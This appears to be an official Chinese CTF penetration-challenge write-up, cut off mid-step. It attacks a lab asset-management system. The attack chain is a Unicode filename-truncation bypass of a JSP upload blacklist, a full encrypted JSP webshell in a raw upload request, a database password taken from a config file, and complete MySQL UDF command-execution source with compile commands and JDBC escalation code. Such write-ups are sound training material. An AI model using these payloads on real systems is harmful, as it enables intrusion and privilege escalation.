---
title: 渗透 · 实战挑战赛|官方WP
url: https://mp.weixin.qq.com/s/tvfueMVwT8NZG9szcI2SgA
source: Doonsec's feed
date: 2026-06-17
fetch_date: 2026-06-18T06:49:15.869586
---

# 渗透 · 实战挑战赛|官方WP

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rapaL0gDxQpvTfQHsBKicpZzqvg8XvfljNWbGicibcpA142HIgfsOic0rO7hojH031qnIBpzRI8ca0gkuvAjAZNzwE3YBzSPYtEHf6LhvcGM700/0?wx_fmt=jpeg)

# 渗透 · 实战挑战赛|官方WP

原创

佚名
佚名

星宇Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/rapaL0gDxQqWuQh5nmlp8KDeVJGyqXy5jwtCdmyu586SHar6llSCLdG9StNGMLNYibW87p2p2S6gywhUnQB2svuZW3OTV1eLOvatptuyPpd0/640?wx_fmt=png&from=appmsg)

# 渗透 · 实战测试挑战赛 官方WriteUp

## 暗渡陈仓

### 第一步：初始访问

访问靶机首页，看到一个企业资产管理系统，具有文件上传功能。

![rId27_image2](https://mmbiz.qpic.cn/sz_mmbiz_png/rapaL0gDxQprm85RDJxodaTMicwMhe6Wvo8VlxjEjFHrWXlXXXbl1bAyrkpOU1WZ36Cb6RNCAp3PeD4wtX85KrnR0Wsj9aJuWZwl9U1ZVxcc/640?wx_fmt=png&from=appmsg)

rId27\_image2

### 第二步：Ghost Bits 上传绕过

尝试上传 .jsp 文件时，系统返回"安全检测：禁止上传 JSP 文件！" ，说明后端存在后缀黑名单检测。

进一步测试发现，当上传包含特殊 Unicode 字符的文件名时，响应中会显示"保存为: [转换后的文件名]"——文件名在处理过程中发生了变化。通过对比原始文件名和转换后的结果，推测后端在校验时使用 Unicode 字符进行比对，但实际写入文件系统时进行了窄化转换（如 char 到 byte 的强制转换），导致高 8 位被丢弃。

构造 Payload ：利用这一特性，使用 Unicode 字符使其低 8 位分别对应 .jsp 的 ASCII 码：

```
# 构造 Ghost Bits payload suffix = ""

for b in b" .jsp" :
c = chr(0x0100 + b) # 高位置 0x01 ，低位保持目标 ASCII suffix += c
# 最终文件名 : shellĮŪųŰ
# 校验时被认为是无害字符 ，写入时被截断为 shell.jsp
```

上传 JSP WebShell

```
POST /upload HTTP/1.1
Host: 172.23.3.32:8080
Content-Type : multipart/form-data; boundary=----geckoformboundary38d249c96fd8960ca81bc872fd164ce3
Accept : text/html,application/xhtml+xml,application/xml;q=0 .9,*/*;q=0 .8
User-Agent : Mozilla/5 .0 (Windows NT 10 .0; Win64; x64) AppleWebKit/537 .36 (KHTML, like Gecko) Chrome/89 .0 .4389 .82 Safari/537 .36
Content-Length : 328
------geckoformboundary38d249c96fd8960ca81bc872fd164ce3
Content-Disposition : form-data; name="file"; filename="testĮŪųŰ "
Content-Type : application/octet-stream
<%@page import="java.util.*,java.io .*,javax.crypto.*,javax.crypto.spec.*" %>
<%!private byte[] Decrypt(byte[] data) throws Exception{String k="e45e329feb5d925b";javax .crypto .Cipher c=javax .crypto .Cipher .getInstance("AES/ECB/PKCS5Padding");c .init(2,new javax .crypto .spec .SecretKeySpec(k .getBytes(),"AES"));byte[] decode bs;Class baseCls ;try{baseCls=Class .forName("java .util .Base64");Object Decoder=baseCls .getMethod("getDecoder", null) .invoke(baseCls, null);decode bs=(byte[]) Decoder .getClass() .getMethod("decode", new Class[]{byte[] .class}) .invoke(Decoder, new Object[]{data});}catch (Throwable e){System .out .println("444444");baseCls = Class .forName("sun .misc .BASE64Decoder");Object Decoder=baseCls .newInstance();decode bs=(byte[]) Decoder .getClass() .getMethod("decodeBuffer",new Class[]{String.class}) .invoke(Decoder, new Object[]{new String(data)});

  }
return c .doFinal(decode bs);

}
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){retu rn
    super .defineClass(b,0,b .length);}}%><%if (request .getMethod() .equals("POST")){
  ByteArrayOutputStream bos = new ByteArrayOutputStream();
  byte[] buf = new byte[512];
  int length=request .getInputStream() .read(buf);
while (length>0)
  {
    byte[] data= Arrays .copyOfRange(buf,0,length);
    bos .write(data);
    length=request .getInputStream() .read(buf);
  }
  out .clear();
  out=pageContext .pushBody();
  new U(this .getClass() .getClassLoader()) .g(Decrypt(bos .toByteArray())) .newInstan
  ce() .equals(pageContext);}
%>
------geckoformboundary38d249c96fd8960ca81bc872fd164ce3--
```

![rId28_image3](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQrKzOo0cVvR4nB6nP8vJx3Ub8rEr0vN4WlsibkbPT0d65FXoTknMkBGI7DLZ6WrMhaP2ptUHW4pvODrExROCDW9SiclbX3pNtNNo/640?wx_fmt=jpeg&from=appmsg)

rId28\_image3

### 第三步：获取低权限 Shell

访问上传的 WebShell ，成功获得命令执行能力，但当前用户为低权限的 tomcatuser ：

![rId29_image4](https://mmbiz.qpic.cn/sz_mmbiz_png/rapaL0gDxQrS3trK4RFZUzkE04qdKRDDY8el64HzYV0IzJ00fZlhO84mJftrth7ibiaEibupBYEfjMLqNcicYhnzDZHp2bb1IJ1VuHhOSItn2yQ/640?wx_fmt=png&from=appmsg)

rId29\_image4

### 第四步：凭据截获

通过 WebShell 查看 Tomcat 配置文件，发现 MySQL 连接信息：

```
/usr/local/tomcat/webapps/ROOT/META-INF/context .xml
```

从中获取到 MySQL root 密码： ShadowF@cets\_DB\_2026!

![rId30_image5](https://mmbiz.qpic.cn/mmbiz_png/rapaL0gDxQqF5g0eibfI7JsV7l6d0Lq9huSMrEbriczp71jXNEK8LAlCgdyS61tUo7dCXeialJCj6fDuIZv7wABjKYQec4EM8iakAaib7xOJW0x8/640?wx_fmt=png&from=appmsg)

rId30\_image5

### 第五步： Flag 定位与读取失败

查找 flag 文件位置：

![rId31_image6](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQo10GhqcvyD1PhfwiaMSBRymMdBLvliblDCUGsPz5tP5LiafoSIUK7nyx5aKL8rWOyuGianmiaRnIZa0aKt4zpsjuEibdZHGMpyIr0gg/640?wx_fmt=jpeg&from=appmsg)

rId31\_image6

尝试直接读取 flag ，但权限不足

### 第六步：权限枚举

检查 MySQL 运行用户，发现 MySQL 以 root 运行

![rId32_image7](https://mmbiz.qpic.cn/sz_mmbiz_png/rapaL0gDxQq4FOHm7IA0qz1lEFibrOBoxXTCaa9m6Kic7zPKSpfBjuTscAgpCCYvaibdBqibFuXicg3vKKNsicIUnkciax9XUvEGYZLBoWF6ibRKmDk/640?wx_fmt=png&from=appmsg)

rId32\_image7

### 第七步：编译并上传 UDF 文件编译 UDF 共享库

在本地环境准备 lib\_mysqludf\_sys.c 源码并编译：

```
#include <stdio .h>
#include <stdlib .h>
#include <string .h>
#include <stdbool .h>
#include <mysql .h>

bool sys_eval_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
void sys_eval_deinit(UDF_INIT *initid);
char *sys_eval(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, c har *is_null, char *error);

bool sys_eval_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
    st rcpy(message, "sys_eval() requires exactly one string argument");
    return 1;
  }
  initid->max_length = 65535;
return 0;
}

void sys_eval_deinit(UDF_INIT *initid) { }

char *sys_eval(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, c
har *is_null, char *error) {
  FILE *fp;
  char *command;
  char *output = NULL;
  size_t output_size = 0;
  size_t output_len = 0;
  char buf[1024];

command = (char *)malloc(args->lengths[0] + 1);
if ( !command) {
    *is_null = 1;
    return NULL;
  }
  memcpy(command, args->args[0], args->lengths[0]);
command[args->lengths[0]] = '\0 ';

  fp = popen(command, "r");
  free(command);

if ( !fp) {
    *is_null = 1;
    return NULL; }

while (fgets(buf, sizeof(buf), fp) != NULL) {
    size_t len = strlen(buf);
    if (output_len + len + 1 > output_size) {
      output_size = output_len + len + 1 + 4096;
      char *new_output = realloc(output, output_size);
      if ( !new_output) {
        free(output);
        pclose(fp);
        *is_null = 1;
        return NULL;
      }
      output = new_output;
    }
    memcpy(output + output_len, buf, len + 1);
    output_len += len;
  }

  pclose(fp);

if ( !output) {
    *is_null = 1;
    return NULL; }

  *length = output_len;
return output; }

# 安装编译依赖
apt update
# 没有 libmysqlclient-dev 则安装 libmariadb-dev-compat
apt install gcc libmysqlclient-dev
# 编译 UDF 共享库
gcc -shared -fPIC -o lib_mysqludf_sys.so lib_mysqludf_sys.c $(mysql_config --cflags) $(mysql_config --libs)
```

> 注意 ：编译时使用的 MySQL 开发库版本应尽量与靶机 MySQL 版本（ 8.0 ）一致，否则可能出现兼容性问题。

利用文件上传功能直接上传编译好的 lib\_mysqludf\_sys.so ：

上传成功后，文件将保存在 /usr/local/tomcat/webapps/ROOT/uploads/lib\_mysqludf\_sys.so 。

或者通过已获取的 WebShell 写入

### 第八步： UDF 提权执行

冰蝎的数据库管理界面底层调用 executeQuery() ，无法执行 CREATE FUNCTION 等不返回结果集的 DDL 语句。需要在冰蝎「自定义代码」中直接运行 Java 代码，通过 JDBC 完成 UDF 提权。

或者可以通过上传 JSP 来使用 DDL 语句，下面演示以冰蝎为例。

在冰蝎「自定义代码」中输入以下 Java 代码并执行：

```
import javax .servlet .ServletOutputStream;
import javax .servlet .ServletResponse;
import java .sql .*;
import java .util .HashMap;
import java .util .Map;

public class UDFExploit {
  private Object Request;
  private Object Response;
  private Object Session;

  @Override
  public boolean equals(Object obj) {
    try {
      fillContext(obj);
      ServletOutputStream so = ((ServletResponse) Response) .getOutputStream();

      // 加载 MySQL JDBC 驱动
      Class .forName("com .mysql .cj .jdbc .Driver");

      Connection conn = DriverManager .getConnection(
      "jdbc:mysql ://127 .0 .0 .1 :3306/mysql",
      "root", "ShadowF@cets_DB_2026 !");
      Statement stmt = conn .createStatement();

      // 1 . 将上传的 UDF 文件导入 MySQL 插件目录
      stmt .execute(
      "SELECT load_file( '/usr/local/...